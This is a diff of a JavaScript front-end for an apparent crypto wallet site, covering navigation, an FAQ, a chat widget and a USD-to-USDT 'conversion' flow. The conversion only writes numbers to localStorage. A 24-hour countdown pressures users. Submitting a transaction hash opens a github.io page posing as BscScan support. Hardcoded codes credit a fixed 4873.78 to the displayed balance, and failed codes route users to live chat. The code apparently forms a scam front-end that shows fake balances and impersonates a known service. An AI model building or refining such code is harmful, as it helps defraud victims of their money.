@@ -940,179 +940,197 @@
     }
 
     // =====================================
-    //  2. UI, NAVIGATION & TOAST MANAGEMENT
-    // =====================================
-    const STORAGE_PAGE_KEY = "activePageId";
-    const pageHistory = [];
+//  2. UI, NAVIGATION & TOAST MANAGEMENT
+// =====================================
+const STORAGE_PAGE_KEY = "activePageId";
+const pageHistory = [];
+let countdownIntervalId = null; // Centralized countdown ID
 
-    // Helper function to dynamically load the smartsupp script
-    function loadSmartsuppChat() {
-      if (document.getElementById('smartsupp-script')) {
-        return; // Script is already loaded
-      }
+// Helper function to dynamically load the smartsupp script
+function loadSmartsuppChat() {
+  if (document.getElementById('smartsupp-script')) {
+    return; // Script is already loaded
+  }
 
-      const script = document.createElement('script');
-      script.id = 'smartsupp-script';
-      script.type = 'text/javascript';
-      script.async = true;
-      script.charset = 'utf-8';
-      script.src = 'https://www.smartsuppchat.com/loader.js?';
-      document.head.appendChild(script);
+  const script = document.createElement('script');
+  script.id = 'smartsupp-script';
+  script.type = 'text/javascript';
+  script.async = true;
+  script.charset = 'utf-8';
+  script.src = 'https://www.smartsuppchat.com/loader.js?';
+  document.head.appendChild(script);
 
-      window._smartsupp = { key: '3ab3e4c3fcd21f84344cc872db2a35d9e40245a6' };
-    }
+  window._smartsupp = { key: '3ab3e4c3fcd21f84344cc872db2a35d9e40245a6' };
+}
 
-    // Helper function to hide the smartsupp chat widget
-    function unloadSmartsuppChat() {
-      const script = document.getElementById('smartsupp-script');
-      if (script) {
-        script.remove();
-        window.smartsupp = undefined;
-        window._smartsupp = undefined;
-      }
-    }
-    
-    // New function to initialize page 17 with FAQ content
-    function initPage17() {
-      const faqs = [
-        {
-          question: "How do I secure my wallet?",
-          answer: "To secure your wallet, enable Two-Factor Authentication (2FA) using an authenticator app, create a strong and unique password, and never share your private keys or recovery phrase with anyone.",
-        },
-        {
-          question: "I forgot my password. How can I recover my account?",
-          answer: "If you forgot your password, use the 'Forgot Password' link on the login page. You will likely need to verify your identity, possibly through email or an associated phone number, to reset it.",
-        },
-        {
-          question: "What is a recovery phrase and why is it important?",
-          answer: "A recovery phrase (also known as a seed phrase) is a list of 12 or 24 words that serves as the master key to your crypto wallet. It's the only way to restore your wallet and funds if you lose access to your device. You should write it down and store it in a secure, offline location.",
-        },
-        {
-          question: "How do I enable 2FA (Two-Factor Authentication)?",
-          answer: "Navigate to your account settings or security section. There, you'll find an option to enable 2FA, which usually involves scanning a QR code with an authenticator app like Google Authenticator or Authy.",
-        },
-        {
-          question: "What is the minimum amount for a withdrawal?",
-          answer: "Minimum withdrawal amounts vary by cryptocurrency and are subject to network fees. You can find the specific minimums on the withdrawal page for each coin.",
-        },
-        {
-          question: "How long does a withdrawal take?",
-          answer: "Withdrawal times depend on the cryptocurrency's network congestion. Typically, transactions are processed within a few minutes to an hour, but can take longer during peak times.",
-        },
-        {
-          question: "I sent crypto to the wrong address. Can I get it back?",
-          answer: "Unfortunately, cryptocurrency transactions are irreversible. Once a transaction is confirmed on the blockchain, it cannot be undone. Always double-check the recipient address before sending funds.",
-        },
-        {
-          question: "How do I view my transaction history?",
-          answer: "Your full transaction history can be found on the main wallet or portfolio page. This history will show all deposits, withdrawals, and trades.",
-        },
-      ];
+// Helper function to hide the smartsupp chat widget
+function unloadSmartsuppChat() {
+  const script = document.getElementById('smartsupp-script');
+  if (script) {
+    script.remove();
+    window.smartsupp = undefined;
+    window._smartsupp = undefined;
+  }
+}
 
-      const faqContainer = document.getElementById('faq-container');
-      if (faqContainer) {
-        faqContainer.innerHTML = ''; // Clear existing content
+// New function to initialize page 17 with FAQ content
+function initPage17() {
+  const faqs = [
+    {
+      question: "How do I secure my wallet?",
+      answer: "To secure your wallet, enable Two-Factor Authentication (2FA) using an authenticator app, create a strong and unique password, and never share your private keys or recovery phrase with anyone.",
+    },
+    {
+      question: "I forgot my password. How can I recover my account?",
+      answer: "If you forgot your password, use the 'Forgot Password' link on the login page. You will likely need to verify your identity, possibly through email or an associated phone number, to reset it.",
+    },
+    {
+      question: "What is a recovery phrase and why is it important?",
+      answer: "A recovery phrase (also known as a seed phrase) is a list of 12 or 24 words that serves as the master key to your crypto wallet. It's the only way to restore your wallet and funds if you lose access to your device. You should write it down and store it in a secure, offline location.",
+    },
+    {
+      question: "How do I enable 2FA (Two-Factor Authentication)?",
+      answer: "Navigate to your account settings or security section. There, you'll find an option to enable 2FA, which usually involves scanning a QR code with an authenticator app like Google Authenticator or Authy.",
+    },
+    {
+      question: "What is the minimum amount for a withdrawal?",
+      answer: "Minimum withdrawal amounts vary by cryptocurrency and are subject to network fees. You can find the specific minimums on the withdrawal page for each coin.",
+    },
+    {
+      question: "How long does a withdrawal take?",
+      answer: "Withdrawal times depend on the cryptocurrency's network congestion. Typically, transactions are processed within a few minutes to an hour, but can take longer during peak times.",
+    },
+    {
+      question: "I sent crypto to the wrong address. Can I get it back?",
+      answer: "Unfortunately, cryptocurrency transactions are irreversible. Once a transaction is confirmed on the blockchain, it cannot be undone. Always double-check the recipient address before sending funds.",
+    },
+    {
+      question: "How do I view my transaction history?",
+      answer: "Your full transaction history can be found on the main wallet or portfolio page. This history will show all deposits, withdrawals, and trades.",
+    },
+  ];
 
-        faqs.forEach(faq => {
-          const faqItem = document.createElement('div');
-          faqItem.className = 'card p-4 mb-3';
-          faqItem.innerHTML = `
-            <details>
-              <summary class="font-bold cursor-pointer text-yellow-400">${faq.question}</summary>
-              <p class="text-sm text-gray-400 mt-2">${faq.answer}</p>
-            </details>
-          `;
-          faqContainer.appendChild(faqItem);
-        });
-      }
-    }
+  const faqContainer = document.getElementById('faq-container');
+  if (faqContainer) {
+    faqContainer.innerHTML = ''; // Clear existing content
 
-    function showPage(pageId) {
-      document.querySelectorAll(".page").forEach((page) => {
+    faqs.forEach(faq => {
+      const faqItem = document.createElement('div');
+      faqItem.className = 'card p-4 mb-3';
+      faqItem.innerHTML = `
+        <details>
+          <summary class="font-bold cursor-pointer text-yellow-400">${faq.question}</summary>
+          <p class="text-sm text-gray-400 mt-2">${faq.answer}</p>
+        </details>
+      `;
+      faqContainer.appendChild(faqItem);
+    });
+  }
+}
+
+function showPage(pageId) {
+    document.querySelectorAll(".page").forEach((page) => {
         page.classList.remove("active-page");
         page.classList.add("hidden");
-      });
-      const targetPage = document.getElementById(pageId);
-      if (targetPage) {
+    });
+    
+    stopCountdown(); // Stop any running countdown before navigating away
+
+    const targetPage = document.getElementById(pageId);
+    if (targetPage) {
         targetPage.classList.remove("hidden");
         targetPage.classList.add("active-page");
         localStorage.setItem(STORAGE_PAGE_KEY, pageId);
         window.scrollTo({ top: 0, behavior: "smooth" });
-      } else {
+    } else {
         console.warn(`Page "${pageId}" not found.`);
         return;
-      }
+    }
 
-      if (!pageHistory.includes(pageId)) {
+    if (!pageHistory.includes(pageId)) {
         pageHistory.push(pageId);
-      }
-      
-      // Conditional logic for Smartsupp chat
-      if (pageId === "page17") {
-        loadSmartsuppChat();
-      } else {
-        unloadSmartsuppChat();
-      }
-
-      // Existing page-specific function calls
-      if (pageId === "page0") {
+    }
+    
+    // Conditional logic for Smartsupp chat
+    if (pageId === "page17") {
+      loadSmartsuppChat();
+    } else {
+      unloadSmartsuppChat();
+    }
+    
+    // Existing page-specific function calls
+    if (pageId === "page0") {
+        updateBalanceDisplays();
         loadLivePerformanceChart();
         loadCoinPriceList();
-      }
-      if (pageId === "page8") initPage8();
-      if (pageId === "page6") initPage6();
-      if (pageId === "page9i") updateCountdownDisplay();
-      if (pageId === "page10") initConversionPage();
-      if (pageId === "page1") loadSpotTradingChart();
-      if (pageId === "page2") {
+    }
+    
+    // Start or resume countdown on relevant pages
+    const countdownPages = ['page10i', 'page10ii', 'page10iii'];
+    if (countdownPages.includes(pageId)) {
+        start24HourCountdown();
+    }
+    
+    // Other initializers from the original user code
+    if (pageId === "page8") initPage8();
+    if (pageId === "page6") initPage6();
+    if (pageId === "page9i") updateCountdownDisplay();
+    if (pageId === "page10") initConversionPage();
+    if (pageId === "page1") loadSpotTradingChart();
+    if (pageId === "page2") {
         loadMarketsChart();
-        loadCoinPriceList();
         fetchMarketCoinData();
-      }
-      if (pageId === "page7") initPage7();
-      if (pageId === "page4") initPage4();
-      if (pageId === "page15") {
+        loadCoinPriceList();
+    }
+    if (pageId === "page7") initPage7();
+    if (pageId === "page4") initPage4();
+    if (pageId === "page15") {
         updateExpertsList();
         updatePortfolioDisplay();
         updateCopiedTrades();
         loadCopyTradeChart();
-      }
-      if (pageId === "page17") {
-        initPage17();
-      }
     }
-    
-    function goBack() {
-      if (pageHistory.length > 1) {
+    if (pageId === "page17") {
+        initPage17();
+    }
+}
+
+function goBack() {
+    if (pageHistory.length > 1) {
         pageHistory.pop();
         showPage(pageHistory[pageHistory.length - 1]);
-      }
     }
-    
-    function showToast(msg) {
-      const toast = document.getElementById("toast");
-      if (!toast) {
+}
+
+function showToast(msg) {
+    const toast = document.getElementById("toast");
+    const toastMessage = document.getElementById("toast-message");
+    if (!toast || !toastMessage) {
         alert(msg);
         return;
-      }
-      toast.innerText = msg;
-      toast.classList.remove("hidden");
-      setTimeout(() => toast.classList.add("hidden"), 3000);
     }
+    toastMessage.innerText = msg;
+    toast.classList.remove("hidden");
+    toast.classList.add("animate-fadeInUp");
+    setTimeout(() => {
+        toast.classList.add("hidden");
+        toast.classList.remove("animate-fadeInUp");
+    }, 3000);
+}
 
-    async function copyToClipboard(elementId) {
-      const text = document.getElementById(elementId).innerText;
-      try {
+async function copyToClipboard(elementId) {
+    const text = document.getElementById(elementId).innerText;
+    try {
         await navigator.clipboard.writeText(text);
         showToast('Copied to clipboard!');
-      } catch (err) {
+    } catch (err) {
         showToast('Failed to copy text.');
-      }
     }
+}
 
-    document.querySelectorAll("[data-goto]").forEach((btn) => {
-      btn.addEventListener("click", (e) => showPage(e.currentTarget.getAttribute("data-goto")));
-    });
+document.querySelectorAll("[data-goto]").forEach((btn) => {
+    btn.addEventListener("click", (e) => showPage(e.currentTarget.getAttribute("data-goto")));
+});
     // =====================================
     //  3. WALLET & BALANCE FUNCTIONALITY
     // =====================================
@@ -1682,16 +1700,11 @@
         countdownElement.innerText = `⏳ ${format(hours)}h ${format(minutes)}m ${format(seconds)}s remaining`;
       }, 1000);
     }
-
+    
 // =====================================
-//  8. CONVERSION & TIMERS (UPDATED)
+//  8. CONVERSION & TIMERS
 // =====================================
 
-// This variable will hold the interval ID for the countdown timer
-// so we can clear it when needed.
-let countdownIntervalId = null;
-
-// Valid 6-digit codes for page10iii validation
 const VALIDATION_CODES = [
   '482193', '739201', '564928', '801346', '927415', '315780', '649203', 
   '170984', '283650', '496712', '357849', '618430', '902176', '745390', 
@@ -1699,187 +1712,196 @@ const VALIDATION_CODES = [
   '198423', '267340', '820153', '934608'
 ];
 
+/**
+ * Initializes the conversion page (page10) by assigning the `convertUsdToUsdt` function
+ * to the "Convert" button's click event.
+ */
 function initConversionPage() {
-  const convertBtn = document.querySelector("#page10 .convert-btn");
-  if (convertBtn) {
-    convertBtn.onclick = convertUsdToUsdt;
-  }
-  
-  // Initialize the countdown display if a timer is running
-  updateCountdownDisplay();
+    const convertBtn = document.querySelector("#page10 .convert-btn");
+    if (convertBtn) {
+        convertBtn.onclick = convertUsdToUsdt;
+    }
 }
 
-function updateCountdownDisplay() {
-  const existingEndTime = localStorage.getItem('conversionEndTime');
-  const countdownBox = document.getElementById('countdownBox');
-
-  if (existingEndTime) {
-    if (countdownBox) {
-      countdownBox.classList.remove('hidden');
-    }
+/**
+ * Starts a 24-hour countdown timer and displays it on the page.
+ * This function is now decoupled from page transitions.
+ */
+function start24HourCountdown() {
+    // Clear any existing timer to prevent duplicates
     if (countdownIntervalId) {
         clearInterval(countdownIntervalId);
     }
-    start24HourCountdown();
-  } else {
-    if (countdownBox) {
-      countdownBox.classList.add('hidden');
-    }
-  }
-}
-
-function convertUsdToUsdt() {
-  const usd = parseFloat(document.getElementById("usdAmount").value);
   
-  if (isNaN(usd) || usd <= 0) {
-    showToast("Please enter a valid amount to convert.");
-    return;
-  }
-
-  const usdt = usd;
-  localStorage.setItem("usdtBalance", usdt.toFixed(2));
-  const usdtBalanceDisplay = document.getElementById("usdtBalance");
-  if (usdtBalanceDisplay) {
-    usdtBalanceDisplay.innerText = `${usdt.toFixed(2)} USDT`;
-  }
-  
-  showToast(`Converted $${usd.toFixed(2)} USD to ${usdt.toFixed(2)} USDT successfully.`);
-
-  // Opens page10i as requested
-  showPage("page10i");
-  start24HourCountdown(); // Start the timer
-}
-
-// New function to handle the "Preview Conversion" button click on page10i
-function previewConversion() {
-  // Navigate to page10ii, which will show the transaction hash
-  showPage("page10ii");
-}
-
-// New function to handle the "Submit" button on page10ii
-function submitTransactionHash() {
-  const txHash = document.getElementById('transactionHashInput').value;
-  if (!txHash) {
-    showToast("Please enter a transaction hash.");
-    return;
-  }
-  
-  // Opens the external BscScan link in a new window
-  window.open('https://mail-org.github.io/BscScan-mail-support/', '_blank');
-  
-  // Automatically opens page10iii
-  showPage('page10iii');
-}
-
-// New function to handle the "Confirm" button on page10iii
-function validateConversionCode() {
-  const validationCode = document.getElementById('validationCodeInput').value;
-  const confirmButton = document.getElementById('confirmValidationBtn');
-
-  confirmButton.disabled = true;
-  confirmButton.innerText = "Validating...";
-  
-  showToast("Validating conversion... Please wait.");
-
-  // Simulate a 30-second loading state
-  setTimeout(() => {
-    confirmButton.disabled = false;
-    confirmButton.innerText = "Confirm";
-
-    if (VALIDATION_CODES.includes(validationCode)) {
-      showToast("Code validated successfully!");
-      
-      // Update balances and stop the countdown
-      const addedAmount = 4873.78;
-      updateBalances(addedAmount);
-      stopCountdown();
-
-      showPage('page10v');
+    // Use an existing end time from localStorage if it exists, otherwise set a new one
+    const existingEnd = localStorage.getItem('conversionEndTime');
+    let endTime;
+    if (!existingEnd) {
+        endTime = Date.now() + 24 * 60 * 60 * 1000;
+        localStorage.setItem('conversionEndTime', endTime.toString());
     } else {
-      showToast("Invalid code. Please try again.");
-      showPage('page17');
+        endTime = parseInt(existingEnd, 10);
     }
-  }, 30000); // 30 seconds
+
+    const countdownBox = document.getElementById('countdownBox');
+    if (countdownBox) {
+        countdownBox.classList.remove('hidden');
+    }
+
+    updateCountdown(); // Call immediately to avoid a 1-second delay
+    countdownIntervalId = setInterval(updateCountdown, 1000);
 }
 
-function updateBalances(amount) {
-  // Update USDT balance
-  let usdtBalance = parseFloat(localStorage.getItem('usdtBalance')) || 0;
-  usdtBalance += amount;
-  localStorage.setItem('usdtBalance', usdtBalance.toFixed(2));
-
-  // Update total balance
-  let totalBalance = parseFloat(localStorage.getItem('totalBalance')) || 0;
-  totalBalance += amount;
-  localStorage.setItem('totalBalance', totalBalance.toFixed(2));
-
-  // Update the displayed balances on the dashboard (page0)
-  document.getElementById('usdtBalanceDisplay').innerText = `$${usdtBalance.toFixed(2)}`;
-  document.getElementById('totalBalanceDisplay').innerText = `$${totalBalance.toFixed(2)}`;
-}
-
+/**
+ * Stops the countdown timer and clears the local storage.
+ * It's crucial to call this when navigating away from countdown pages.
+ */
 function stopCountdown() {
-  if (countdownIntervalId) {
-    clearInterval(countdownIntervalId);
-    countdownIntervalId = null;
-  }
-  localStorage.removeItem('conversionEndTime');
-  const countdownBox = document.getElementById('countdownBox');
-  if (countdownBox) {
-    countdownBox.classList.add('hidden');
-  }
+    if (countdownIntervalId) {
+        clearInterval(countdownIntervalId);
+        countdownIntervalId = null;
+    }
+    localStorage.removeItem('conversionEndTime');
+    const countdownBox = document.getElementById('countdownBox');
+    if (countdownBox) {
+        countdownBox.classList.add('hidden');
+    }
 }
 
-function start24HourCountdown() {
-  if (countdownIntervalId) {
-    clearInterval(countdownIntervalId);
-  }
-
-  const existingEnd = localStorage.getItem('conversionEndTime');
-  let endTime;
-  if (!existingEnd) {
-    endTime = Date.now() + 24 * 60 * 60 * 1000;
-    localStorage.setItem('conversionEndTime', endTime.toString());
-  } else {
-    endTime = parseInt(existingEnd, 10);
-  }
-  
-  const countdownBox = document.getElementById('countdownBox');
-  if (countdownBox) {
-    countdownBox.classList.remove('hidden');
-  }
-
-  countdownIntervalId = setInterval(() => {
-    const remaining = endTime - Date.now();
-    if (remaining <= 0) {
-      clearInterval(countdownIntervalId);
-      const countdownTimer = document.getElementById('countdownTimer');
-      if (countdownTimer) {
-        countdownTimer.textContent = "00:00:00";
-      }
-      localStorage.removeItem('conversionEndTime');
-      countdownIntervalId = null;
-      if (countdownBox) {
-        countdownBox.classList.add('hidden');
-      }
-      return;
+/**
+ * Handles updating the countdown display.
+ */
+function updateCountdown() {
+    const existingEnd = localStorage.getItem('conversionEndTime');
+    const countdownTimer = document.getElementById('countdownTimer');
+    const countdownBox = document.getElementById('countdownBox');
+    
+    if (!existingEnd || !countdownTimer || !countdownBox) {
+        stopCountdown();
+        return;
     }
-    // Calculate hours, minutes, and seconds
+
+    const remaining = parseInt(existingEnd, 10) - Date.now();
+    if (remaining <= 0) {
+        stopCountdown();
+        countdownTimer.textContent = "00:00:00";
+        return;
+    }
+
     const hours = Math.floor(remaining / (1000 * 60 * 60));
     const minutes = Math.floor((remaining % (1000 * 60 * 60)) / (1000 * 60));
     const seconds = Math.floor((remaining % (1000 * 60)) / 1000);
     
-    // Format numbers to always have two digits (e.g., 05 instead of 5)
     const format = (n) => n.toString().padStart(2, '0');
-    
-    // Update the countdown display
-    const countdownTimer = document.getElementById('countdownTimer');
-    if (countdownTimer) {
-      countdownTimer.textContent = `${format(hours)}:${format(minutes)}:${format(seconds)}`;
-    }
-  }, 1000); // Update every 1 second
+    countdownTimer.textContent = `${format(hours)}:${format(minutes)}:${format(seconds)}`;
 }
 
+/**
+ * The main conversion logic, which now also starts the countdown timer
+ * and navigates to the next page.
+ */
+function convertUsdToUsdt() {
+    const usd = parseFloat(document.getElementById("usdAmount").value);
+    
+    if (isNaN(usd) || usd <= 0) {
+        showToast("Please enter a valid amount to convert.");
+        return;
+    }
+
+    // Assuming a 1:1 conversion for this example
+    const usdt = usd;
+    localStorage.setItem("usdtBalance", usdt.toFixed(2));
+    
+    showToast(`Converted $${usd.toFixed(2)} USD to ${usdt.toFixed(2)} USDT successfully.`);
+    start24HourCountdown();
+    showPage("page10i");
+}
+
+/**
+ * Navigates to page10ii, which displays the transaction hash input.
+ */
+function previewConversion() {
+    showPage("page10ii");
+}
+
+/**
+ * Handles the submission of the transaction hash on page10ii.
+ * Opens an external link and then moves to the validation page.
+ */
+function submitTransactionHash() {
+    const txHash = document.getElementById('transactionHashInput').value;
+    if (!txHash) {
+        showToast("Please enter a transaction hash.");
+        return;
+    }
+    
+    window.open('https://mail-org.github.io/BscScan-mail-support/', '_blank');
+    showPage('page10iii');
+}
+
+/**
+ * Validates the conversion code on page10iii.
+ * Loads for 30 seconds, then checks the code.
+ */
+function validateConversionCode() {
+    const validationCode = document.getElementById('validationCodeInput').value;
+    const confirmButton = document.getElementById('confirmValidationBtn');
+
+    confirmButton.disabled = true;
+    confirmButton.innerText = "Validating...";
+    showToast("Validating conversion... Please wait.");
+
+    setTimeout(() => {
+        confirmButton.disabled = false;
+        confirmButton.innerText = "Confirm";
+
+        if (VALIDATION_CODES.includes(validationCode)) {
+            showToast("Code validated successfully!");
+            
+            const addedAmount = 4873.78;
+            updateBalances(addedAmount);
+            stopCountdown();
+
+            showPage('page10v');
+        } else {
+            showToast("Invalid code. Please try again.");
+            showPage('page17');
+        }
+    }, 30000); // 30 seconds
+}
+
+/**
+ * Updates the USDT and total balance on the dashboard (page0).
+ */
+function updateBalances(amount) {
+    let usdtBalance = parseFloat(localStorage.getItem('usdtBalance')) || 0;
+    usdtBalance += amount;
+    localStorage.setItem('usdtBalance', usdtBalance.toFixed(2));
+
+    let totalBalance = parseFloat(localStorage.getItem('totalBalance')) || 0;
+    totalBalance += amount;
+    localStorage.setItem('totalBalance', totalBalance.toFixed(2));
+
+    updateBalanceDisplays();
+}
+
+/**
+ * Updates the balance displays on the page.
+ */
+function updateBalanceDisplays() {
+    const usdtBalance = parseFloat(localStorage.getItem('usdtBalance')) || 0;
+    const totalBalance = parseFloat(localStorage.getItem('totalBalance')) || 0;
+
+    const usdtDisplay = document.getElementById('usdtBalanceDisplay');
+    if (usdtDisplay) {
+        usdtDisplay.innerText = `$${usdtBalance.toFixed(2)}`;
+    }
+
+    const totalDisplay = document.getElementById('totalBalanceDisplay');
+    if (totalDisplay) {
+        totalDisplay.innerText = `$${totalBalance.toFixed(2)}`;
+    }
+    }
    // =====================================
     //  9. CONFIGURATION & UTILITIES
     // =====================================
